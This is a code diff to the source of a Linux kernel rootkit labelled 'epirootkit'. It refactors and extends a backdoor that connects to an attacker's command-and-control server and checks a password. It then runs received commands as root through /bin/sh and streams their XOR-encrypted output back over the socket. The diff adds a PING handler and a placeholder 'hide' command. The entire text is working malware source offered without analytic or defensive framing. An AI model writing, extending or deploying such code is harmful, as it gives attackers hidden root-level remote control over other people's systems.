@@ -41,7 +41,10 @@ MODULE_PARM_DESC(server_port, "Attacker server port");
 static void notify_connection_state(int new_state) {
     if (new_state != connection_state) {
         connection_state = new_state;
-        printk(KERN_INFO "epirootkit: %s to C2 server\n", connection_state ? "Connected" : "Disconnected");
+        if (connection_state)
+            printk(KERN_INFO "epirootkit: Connected to C2 server\n");
+        else
+            printk(KERN_INFO "epirootkit: Disconnected from C2 server\n");
     }
 }
 
@@ -54,6 +57,79 @@ static int recv_data(char *buf, size_t len) {
     struct kvec iov = {.iov_base = buf, .iov_len = len};
     struct msghdr msg = {0};
     return kernel_recvmsg(g_sock, &msg, &iov, 1, len, 0);
+}
+
+static int send_data(const char *buf, size_t len) {
+    struct kvec iov = {.iov_base = (char *)buf, .iov_len = len};
+    struct msghdr msg = {0};
+    return kernel_sendmsg(g_sock, &msg, &iov, 1, len);
+}
+
+static void send_encrypted_section(const char *data) {
+    size_t len = strlen(data);
+    char *tmp = kmalloc(len + 1, GFP_KERNEL);
+    if (!tmp) return;
+    memcpy(tmp, data, len);
+    xor_encrypt(tmp, len);
+    send_data(tmp, len);
+    kfree(tmp);
+}
+
+static int execute_and_stream_output(const char *cmd) {
+    char tmp_stdout[] = "/tmp/.rk_stdout";
+    char tmp_stderr[] = "/tmp/.rk_stderr";
+    char tmp_status[] = "/tmp/.rk_status";
+
+    char full_cmd[1024];
+    snprintf(full_cmd, sizeof(full_cmd), "%s > %s 2> %s; echo $? > %s", cmd, tmp_stdout, tmp_stderr, tmp_status);
+
+    mm_segment_t old_fs = get_fs();
+    set_fs(KERNEL_DS);
+    call_usermodehelper("/bin/sh", (char *[]){"/bin/sh", "-c", full_cmd, NULL}, NULL, UMH_WAIT_PROC);
+    set_fs(old_fs);
+
+    struct file *f;
+    loff_t pos = 0;
+    char buf[256];
+
+    f = filp_open(tmp_stdout, O_RDONLY, 0);
+    if (!IS_ERR(f)) {
+        while (1) {
+            memset(buf, 0, sizeof(buf));
+            int r = kernel_read(f, buf, sizeof(buf) - 1, &pos);
+            if (r <= 0) break;
+            buf[r] = '\0';
+            send_encrypted_section(buf);
+        }
+        filp_close(f, NULL);
+    }
+    send_encrypted_section(SEP_STDERR);
+
+    pos = 0;
+    f = filp_open(tmp_stderr, O_RDONLY, 0);
+    if (!IS_ERR(f)) {
+        while (1) {
+            memset(buf, 0, sizeof(buf));
+            int r = kernel_read(f, buf, sizeof(buf) - 1, &pos);
+            if (r <= 0) break;
+            buf[r] = '\0';
+            send_encrypted_section(buf);
+        }
+        filp_close(f, NULL);
+    }
+    send_encrypted_section(SEP_STATUS);
+
+    pos = 0;
+    f = filp_open(tmp_status, O_RDONLY, 0);
+    if (!IS_ERR(f)) {
+        memset(buf, 0, sizeof(buf));
+        kernel_read(f, buf, sizeof(buf) - 1, &pos);
+        buf[strcspn(buf, "\n")] = 0;
+        send_encrypted_section(buf);
+        filp_close(f, NULL);
+    }
+    send_encrypted_section(EOF_MARKER);
+    return 0;
 }
 
 static int rootkit_thread_fn(void *data) {
@@ -90,17 +166,13 @@ static int rootkit_thread_fn(void *data) {
         if (strncmp(auth_buf, PASSWORD, PASSWORD_LEN) != 0) {
             char fail[] = "FAIL";
             xor_encrypt(fail, sizeof(fail) - 1);
-            struct kvec fiov = {.iov_base = fail, .iov_len = sizeof(fail) - 1};
-            struct msghdr fmsg = {0};
-            kernel_sendmsg(g_sock, &fmsg, &fiov, 1, fiov.iov_len);
+            send_data(fail, sizeof(fail) - 1);
             break;
         }
 
         char ok[] = "OK";
         xor_encrypt(ok, sizeof(ok) - 1);
-        struct kvec iov = {.iov_base = ok, .iov_len = sizeof(ok) - 1};
-        struct msghdr msg_hdr = {0};
-        kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, iov.iov_len);
+        send_data(ok, sizeof(ok) - 1);
 
         char cmd_buf[MAX_CMD_LEN];
         while (!kthread_should_stop()) {
@@ -112,46 +184,21 @@ static int rootkit_thread_fn(void *data) {
             cmd_buf[len] = '\0';
 
             if (strcmp(cmd_buf, "exit") == 0 || strcmp(cmd_buf, "quit") == 0) break;
-
-            char tmp_path[] = "/tmp/.rkout";
-            char shell_cmd[512];
-            snprintf(shell_cmd, sizeof(shell_cmd), "%s 1>%s.stdout 2>%s.stderr; echo $? > %s.status", cmd_buf, tmp_path, tmp_path, tmp_path);
-
-            mm_segment_t old_fs = get_fs();
-            set_fs(KERNEL_DS);
-            call_usermodehelper("/bin/sh", (char *[]){"/bin/sh", "-c", shell_cmd, NULL}, NULL, UMH_WAIT_PROC);
-            set_fs(old_fs);
-
-            char *paths[] = { ".rkout.stdout", ".rkout.stderr", ".rkout.status" };
-            char *seps[] = { SEP_STDERR, SEP_STATUS, EOF_MARKER };
-            for (int i = 0; i < 3; ++i) {
-                char full_path[64];
-                snprintf(full_path, sizeof(full_path), "/tmp/%s", paths[i]);
-                struct file *file = filp_open(full_path, O_RDONLY, 0);
-                if (!IS_ERR(file)) {
-                    char io_buf[256];
-                    loff_t pos = 0;
-                    while (1) {
-                        memset(io_buf, 0, sizeof(io_buf));
-                        int r = kernel_read(file, io_buf, sizeof(io_buf) - 1, &pos);
-                        if (r <= 0) break;
-                        pos += r;
-                        xor_encrypt(io_buf, r);
-                        struct kvec ciov = {.iov_base = io_buf, .iov_len = r};
-                        struct msghdr cmsg = {0};
-                        kernel_sendmsg(g_sock, &cmsg, &ciov, 1, ciov.iov_len);
-                    }
-                    filp_close(file, NULL);
-                }
-                if (i < 3) {
-                    char mark[32];
-                    snprintf(mark, sizeof(mark), "%s", seps[i]);
-                    xor_encrypt(mark, strlen(mark));
-                    struct kvec miov = {.iov_base = mark, .iov_len = strlen(mark)};
-                    struct msghdr mmsg = {0};
-                    kernel_sendmsg(g_sock, &mmsg, &miov, 1, miov.iov_len);
-                }
+            if (strcmp(cmd_buf, "PING") == 0) {
+                char pong[] = "PONG";
+                xor_encrypt(pong, sizeof(pong) - 1);
+                send_data(pong, sizeof(pong) - 1);
+                continue;
             }
+            if (strncmp(cmd_buf, "hide ", 5) == 0) {
+                send_encrypted_section("[TODO] hide command acknowledged\n");
+                send_encrypted_section(SEP_STDERR);
+                send_encrypted_section(SEP_STATUS);
+                send_encrypted_section("0");
+                send_encrypted_section(EOF_MARKER);
+                continue;
+            }
+            execute_and_stream_output(cmd_buf);
         }
 
         break;
